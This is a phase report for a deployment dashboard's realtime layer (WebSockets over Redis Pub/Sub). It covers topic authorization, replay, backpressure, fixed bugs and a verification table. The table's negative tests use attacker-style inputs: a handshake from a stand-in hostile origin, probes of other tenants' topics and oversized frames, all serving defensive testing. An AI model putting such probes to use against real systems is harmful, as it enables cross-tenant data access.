`DeploymentsPanel` and the fleet page render exactly the shapes the socket will push, so the polling
`useQuery` calls are what gets replaced.

---

## Phase 5 — Realtime (WebSockets + Pub/Sub) ✅

**Goal:** the dashboard shows the pipeline moving *live*.
**Completed:** 2026-09-07.

### What shipped

**`packages/shared`** (`src/realtime.ts`, new)
- **The WS wire contract**, shared by the gateway and the dashboard so neither can drift.
  Client→server: `subscribe` (with an optional `afterEventId` replay cursor), `unsubscribe`, `ping`.
  Server→client: the roadmap's four data/error types — `status`, `log`, `metric`, `error` — plus the
  control frames `hello`, `subscribed`, `unsubscribed`, `pong`. `WS_PROTOCOL_VERSION` is sent in
  `hello` so a future incompatible change is detectable.
- **`parseWsTopic()`** — the one place a client-supplied topic string is validated. A topic name *is*
  the Redis channel name (`REDIS_CHANNELS`), so the parser is strict: `<kind>:<uuid>` for
  `deployment`/`project`/`org`, or the bare `metrics`. Anything else is rejected rather than
  normalised, because the string reaches Redis.
- `metricMessageSchema` — the `metric` frame the roadmap's contract calls for. Defined here; Phase 9
  supplies the publisher.
- Limits, all named in one place: `MAX_WS_CLIENT_FRAME_BYTES` (4 KiB), `MAX_TOPICS_PER_SOCKET` (32),
  `WS_SEND_BUFFER_LIMIT_BYTES` (1 MiB), `WS_REPLAY_LIMIT` (500), `WS_HEARTBEAT_MS` (30 s).
- `WS_CLOSE` — our application close codes (4401 session ended, 4403 origin refused, 4408 heartbeat
  timeout) so a client can tell "you were logged out" from "the server went away".
- `deploymentStatusMessageSchema` / `deploymentLogMessageSchema` gained **`orgId`**, which is what
  makes the `org:<id>` topic well-defined instead of a channel nothing publishes to.

**`apps/api`** (version `0.5.0`)
- `lib/pubsub.ts` — **the Redis Pub/Sub → local-sockets bridge.** One subscriber connection per API
  process (a subscriber can issue nothing but (un)subscribe, so it cannot be the command connection),
  with **refcounted** channels: the first local listener triggers `SUBSCRIBE`, the last one to leave
  triggers `UNSUBSCRIBE`, and an idle process holds none. N browsers watching one deployment cost one
  Redis subscription.
- `realtime/topic-access.ts` — **`authorizeTopic()`**. A topic carries another tenant's build logs, so
  subscribing runs the same RBAC as the REST route that returns the same data: resolve the topic to an
  org, then verify membership. A topic the caller may not see is reported *unknown*, not forbidden —
  the same reason `requireOrg` answers 404 — so ids can't be probed to enumerate other orgs.
- `realtime/replay.ts` — `loadReplay()` + `eventToFrame()`: rebuilds published frames from their
  `deployment_events` rows. `id` is monotonic, so it is both the cursor and the de-duplication key.
- `realtime/client-socket.ts` — **one browser connection**: its subscription registry, per-topic replay
  cursor, message queue, and the bounded-buffer policy. Hand-written per `CLAUDE.md §4`.
- `plugins/realtime.ts` — the gateway route (`GET /ws`), the **origin allowlist**, the shared heartbeat
  timer, credential/authorization re-validation, and the shutdown drain. `realtimeStats()` is
  decorated for Phase 9.
- `lib/redis.ts` comment updated (the subscriber connection Phase 0 said would arrive here has).
- `server.ts` — `closePubSub()` added to the shutdown sequence.
- `repositories/project-repository.ts` — `findProjectOrg()`: an *unscoped* project→org lookup used only
  to derive which org a `project:<id>` topic belongs to. Resolving the org is not authorization; the
  membership check that follows is. Every data read stays org-scoped.
- `config`: `API_INSTANCE_ID` (defaults to `<hostname>-<pid>`, mirroring `WORKER_NAME`).

**`apps/worker`**
- `deployment-state.ts` — publishes each frame to **three** channels now (`deployment:`, `project:`,
  `org:`), one per topic the dashboard can watch, and records **`status` on log events** as well as
  status events (see bugs, #1).

**`apps/dashboard`**
- `lib/realtime.ts` — `RealtimeClient`: **one socket per tab**, multiplexed over topics, with capped
  exponential backoff **plus jitter** (so N tabs don't reconnect in lockstep), a **per-topic cursor**
  resent as `afterEventId` on reconnect, and refcounted local subscriptions mirroring the server's.
  It stops retrying on 4401/4403, where retrying cannot help.
- `components/realtime-provider.tsx` — owns the tab's socket above the pages, so navigating between
  projects changes subscriptions rather than re-authenticating. `useTopic()` holds handlers in refs so
  a re-render doesn't resubscribe (which would replay the history again).
- `components/deployments-panel.tsx` — **WS-driven.** The project topic patches the history list; the
  selected deployment's topic streams its timeline (replay, then live). Frames are batched on an 80 ms
  timer, because Phase 6 streams real build output down this same path. The log box auto-scrolls but
  stops following once the reader scrolls up.
- `components/app-shell.tsx` — a **realtime status badge** (Live / Connecting / Reconnecting / Offline)
  that also names the API instance from the `hello` frame — the visible half of the fan-out demo.
- `app/orgs/[orgSlug]/fleet/page.tsx` — the org-wide activity feed is now event-driven off the `org:`
  topic; queue counters and worker heartbeats still poll (no publisher until Phase 9).

### Decisions & assumptions

- **A topic name is a Redis channel name.** The gateway's job is then a refcounted
  `SUBSCRIBE`/`UNSUBSCRIBE` per topic rather than a translation table. This is why `parseWsTopic` is
  strict rather than lenient.
- **Browsers authenticate the handshake with the session cookie; no token in the URL.** A query string
  ends up in access logs, and `CLAUDE.md §8` says secrets are never logged. The cookie works because
  the dashboard and the API differ only by port, and ports don't affect same-site. Non-browser clients
  use `Authorization` (which is how every script in the verification table connects).
- **The origin allowlist is applied by hand.** A WebSocket upgrade is *not* subject to CORS: the browser
  will upgrade from any origin and send the session cookie with it, so without this check any page the
  user visits could read their build logs (cross-site WebSocket hijacking). A missing `Origin` is
  allowed — that's a non-browser client, which carries no ambient cookies and isn't the threat.
- **Only `deployment:<id>` replays.** `project:`/`org:` carry frames from many deployments, so a single
  cursor would be meaningless there; those topics are live-only and the dashboard pairs them with a
  REST read.
- **Subscribe to Redis *before* reading the timeline.** Frames arriving during the replay are buffered
  and then de-duplicated against it by event id. The other order would leave a gap instead of an
  overlap. Since the worker writes the event *before* publishing it, this ordering makes "no gap"
  a property of the design rather than of the timing — verified in the table below.
- **Polling is the fallback, not the mechanism.** With the socket open the dashboard issues **zero**
  `/events` requests; when it drops, Phase 4's polling resumes and the UI says so. A realtime outage
  degrades rather than freezing.
- **The list is patched from frames and read back only when it must be.** A status frame carries only
  the new status, so a settled deployment (or one this tab has never seen) is re-read as a **single
  row**, not by invalidating the list — see bugs, #3.
- **Credentials and authorization are both re-validated on the heartbeat tick.** One timer for all
  sockets, not one per socket. A socket can outlive its session by days and its *membership* by
  hours, and a socket that just sits there receiving notices neither.
- **Backpressure drops and reports.** Past 1 MiB buffered, data frames are dropped and the client is
  told the count so it can re-read over REST; control frames are never dropped, because dropping a
  `subscribed` ack would break the protocol. Silently rendering an incomplete log would be worse than
  saying so.
- **`metrics` is subscribable but has no publisher yet.** The roadmap's Phase 5 contract lists `metric`,
  and the gateway is generic, so the topic works end to end — there is simply nothing publishing to it
  until Phase 9. Stated here rather than left to look finished.
- **API instance identity is per-process and reported in `hello`**, not registered in Redis. A
  Redis-backed API registry (the mirror of the worker registry) belongs with the Phase 9/10 fleet view;
  showing the serving instance in the badge already proves fan-out with two tabs.

### Bugs found and fixed during verification

1. **Replay could not reconstruct a log frame.** `deployment_events` rows for log lines stored
   `status: null`, but the published `log` frame requires the status the line was produced under — so a
   replayed log line would have had to invent one. Phase 4's `logLine()` now records `status` on log
   rows too (the column already existed, so no migration). Rows written before this fall back to the
   deployment's final status, which is noted in `eventToFrame`.
2. **A failed `SUBSCRIBE` poisoned its channel permanently.** `state.pending = state.pending.then(task)`
   — chaining onto a *rejected* promise skips the callback entirely, so after one failure (Redis down)
   every later attempt on that channel silently no-op'd and the socket could never subscribe to it
   again, even after Redis returned. Fixed with `.catch(() => undefined).then(task)`. **Confirmed by
   reverting the fix**: the regression test goes 1/3 → 3/3.
3. **The dashboard refetched the deployment list on almost every frame.** Invalidating the list query
   from the project-topic handler produced 5 list fetches during a 5 s deployment — event-driven in
   name but indistinguishable from the polling this phase replaced. Replaced with a targeted
   single-row read guarded against in-flight duplicates: **5 → 1** fetch for the same deployment.
4. **An `UNSUBSCRIBE` that failed mid-outage leaked a phantom subscription.** The channel kept
   `subscribed: true` with zero listeners, and ioredis's automatic re-subscribe re-established it on
   every future reconnect — forever. The `ready` handler now reconciles *every* channel in both
   directions rather than only ones missing a subscription.
5. **A removed org member kept receiving events on subscriptions they already held.** Membership was
   checked at subscribe time only, so being removed from an org blocked the *next* subscribe while the
   build logs already flowing kept flowing. `revalidateSubscriptions()` re-runs `authorizeTopic` on the
   heartbeat tick and drops what no longer passes. Both halves are now covered by the RBAC suite.

Hardening in the same pass: the slow-consumer notice moved from "piggyback on the next successful data
frame" to a short timer that fires once the socket has drained. Piggybacking works only while traffic
continues — a flood that *stops* at the drop leaves no next frame to ride on and the client would never
learn its log has a hole. It also now reports one complete count instead of several partial ones
(18 541 in one notice, versus 2 890 in the first of several).

**A test-only failure worth recording, since it cost time:** running `pnpm build` while `next dev` was
running overwrites `.next` and leaves the dev server serving 404 chunks — every page renders empty. It
looked like an application bug for a while and was neither. Don't run the two together.

### Verification (all run on 2026-09-07)

Every suite below is a scratchpad script driving the real stack (Postgres + Redis + API + worker +
dashboard). Counts are the scripts' own assertions.

| Check | Result |
|---|---|
| `pnpm typecheck` | ✅ clean across all 8 workspaces |
| `pnpm lint` | ✅ clean |
| `pnpm build` | ✅ 5 packages + api + worker (tsc) + dashboard (`next build`, 9 routes) |
| **Gateway smoke** — subscribe, deploy, watch | ✅ 9 `status` + 7 `log` frames on `deployment:<id>`, `queued → assigned → … → live`, ids monotonic, 0 errors |
| **Delivered == stored, exactly** — frames vs `deployment_events`, both topics, subscribe delayed 0–2000 ms | ✅ **10/10 rounds**, 16 stored = 16 on `deployment:<id>` = 16 on `project:<id>`; no gap, no duplicate, ordered. Three rounds subscribe with **zero** delay (the tightest race) |
| **Reconnect replay** — `afterEventId` at a mid-timeline cursor | ✅ replays exactly the tail past it (7 of 16); a fully caught-up cursor replays nothing; re-subscribing acks without replaying again |
| **Negative paths** | ✅ **21/21** |
| … handshake with no credential | ✅ `401` |
| … handshake from `http://evil.example.com` | ✅ `403`; from `http://localhost:3000` ✅ accepted |
| … another org's `project:` / a nonexistent deployment / `deployment:not-a-uuid` / `admin:*` | ✅ all `UNKNOWN_TOPIC` |
| … non-JSON and unknown message types | ✅ `BAD_MESSAGE`, socket stays open |
| … oversized client frame (20 KB) | ✅ closed `1009` |
| … `unsubscribe` then a new deployment | ✅ acked, **0 frames leaked** |
| **Topic cap** | ✅ **3/3** — exactly 32 of 33 *real, authorized* topics accepted, 33rd `TOO_MANY_TOPICS`, unsubscribing frees a slot |
| **RBAC on sockets** | ✅ **9/9** |
| … a `viewer` may subscribe to project/org/deployment topics in their org and receives the whole pipeline | ✅ |
| … the same `viewer` still cannot trigger a deployment | ✅ `403` |
| … subscriptions held **before** being removed from the org | ✅ revoked on the next heartbeat tick, **0 frames leaked** afterwards |
| **Session revocation** | ✅ **3/3** — logout closed the open socket with `4401 "session ended"` after 17 s |
| **Redis outage** | ✅ **7/7** |
| … a subscription established before `docker compose restart redis` | ✅ still delivers afterwards; the socket itself survives |
| … subscribing *during* the outage | ✅ `SUBSCRIBE_FAILED` (clean, not a hang); socket stays open; works again once Redis returns |
| … **the same channel** after a failed subscribe (bug #2 regression) | ✅ **3/3** with the fix, **1/3** with it reverted |
| **Two API replicas** (`:4000` + `:4001`) | ✅ **13/13** |
| … deploy through `:4000` only | ✅ the socket on `:4001` saw the **identical** status sequence, via Redis alone |
| … each socket reports its own instance in `hello` | ✅ `soosh-361371` vs `api-replica-2` |
| **Backpressure** — client stops reading (`_socket.pause()`), 20 000 × ~3.6 KB frames published | ✅ **18 541 dropped**, reported to the client once drained, socket survived |
| **Graceful shutdown** — SIGTERM with sockets open | ✅ closed `1001 "server shutting down"`, then `shutdown complete`; the peer replica kept serving and still delivered events |
| **Browser E2E (headless Chrome via CDP)** | ✅ **23/23**, 0 unexpected console errors |
| … badge reaches `open` on its own and names the instance | ✅ |
| … all 6 pipeline stages + `$ npm install` / `$ npm run build` render live | ✅ |
| … **zero `/events` REST polls** while the socket is open | ✅ 0 |
| … deployment list fetches during a ~5 s deployment | ✅ **1** (was 5 before bug #3) |
| … **API restarted mid-deployment** | ✅ badge → `reconnecting`, "falling back to polling" shown, socket reconnects unaided |
| … the timeline after that reconnect | ✅ **16 rendered = 16 stored** — the events published while the API was down were recovered from Postgres, with no duplicates |
| … **two tabs, one deployment** (the phase demo) | ✅ the second tab, which clicked nothing, watched all 6 stages advance to live over its own socket, with 0 event polls |

### Not done / deferred on purpose

- **Still no Vitest suites.** Five phases of accumulated test debt. Verification is scratchpad scripts
  (now nine of them, ~90 assertions) plus the CDP browser suite. They are throwaway scripts in
  `/tmp`, not a committed regression suite — this remains the project's biggest gap.
- **Nothing publishes to `metrics`.** The topic, the `metric` frame and the gateway path all work; the
  publisher is Phase 9. `app.realtimeStats()` is decorated and currently read by nothing.
- **No API-instance registry in Redis.** Each API reports its own socket counts; there is no
  cross-replica view of the gateway the way `workers` gives one of the fleet. Phase 9/10.
- **Worker and queue events are not published**, so the fleet page's counters and worker table still
  poll every 2 s. Only its org-wide activity feed is event-driven.
- **Replay is capped at 500 events** (`WS_REPLAY_LIMIT`) with no pagination. Phase 6's real build logs
  will exceed that for a large build; the client would need to page the REST endpoint for the rest.
  Fine while a deployment is 16 events.
- **`deployment:<id>:logtail`** (the bounded Redis list in `REDIS_KEYS`) is still unused. The replay
  reads Postgres instead. It becomes worthwhile in Phase 6 when log volume makes a Redis tail cheaper
  than a table scan.
- **Authorization refresh is only as fast as the heartbeat** (30 s). A revoked member can receive up to
  one tick's worth of events. Making it immediate needs a Redis invalidation channel; the tick is the
  honest trade-off and is now stated in the code.
- **No WS rate limiting per message**, only on the handshake (60/min) plus the frame-size and
  topic-count caps. A client could `subscribe`/`unsubscribe` in a tight loop; the per-socket message
  queue serialises it, so it costs one socket's own throughput, not the process's.
- **The `metric` frame has no `deploymentId`**, so per-container stats in Phase 9 will need either a
  `scope` convention or a contract addition.

### Next up — Phase 6 (Real builds via `child_process`)

The transport is finished, and it is the part Phase 6 plugs into rather than extends: `logLine()` in the
worker already persists, clamps and publishes a line, and the dashboard already renders a live,
auto-scrolling, batched log view fed by `deployment:<id>`. Phase 6 replaces
`simulated-pipeline.ts`'s `setTimeout`s with real work — copy the source out of storage into a sandbox
dir, then `spawn(cmd, argsArray, { shell: false })` for install and build, piping stdout/stderr through
a line-splitting `Transform` into `logLine()` — plus timeouts, process kill/cleanup on failure, exit-code
capture, and path validation against the deployment's sandbox root. The two things to watch: log volume
will be orders of magnitude higher than 16 events per deployment, which is what the 80 ms frame batching
and the 1 MiB drop policy were built for and what makes `WS_REPLAY_LIMIT` and the unused
`deployment:<id>:logtail` worth revisiting; and real `stdout`/`stderr` is untrusted input, so
`clampLogLine()` stops being theoretical.
